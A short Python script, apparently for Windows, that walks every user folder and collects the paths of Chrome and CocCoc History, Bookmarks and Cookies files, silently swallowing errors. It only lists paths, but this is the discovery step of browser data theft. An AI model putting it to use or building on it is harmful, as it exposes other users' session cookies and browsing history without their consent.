from os.path import os, exists
list_file = ['History','Bookmarks','Cookies']
def get_chrome():
    try:
        list_user = [filename 
                                for filename in os.listdir("C:\\Users\\")]
    
        list_folder =[ "C:\\Users\\" +user+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
                        for user in list_user]
        list_folder +=[ "C:\\Users\\" +user+'\\AppData\\Local\\CocCoc\\Browser\\User Data\\'
                        for user in list_user]
        
        
        list_folder = [folder 
                       for folder in list_folder
                        if(exists(folder))]
        
        
        list_folder_contain_file = []
        for folder in list_folder:
            list_all = os.listdir(folder)
            for folder_child in list_all:
                list_folder_contain_file.append(folder+folder_child)
        
        
        list_path_files = [path+"\\"+file
                            for path in list_folder_contain_file 
                                for file in list_file
                                    if(exists(path+"\\"+file))]
        
        return list_path_files
    except Exception:
        a=0
get_chrome()      
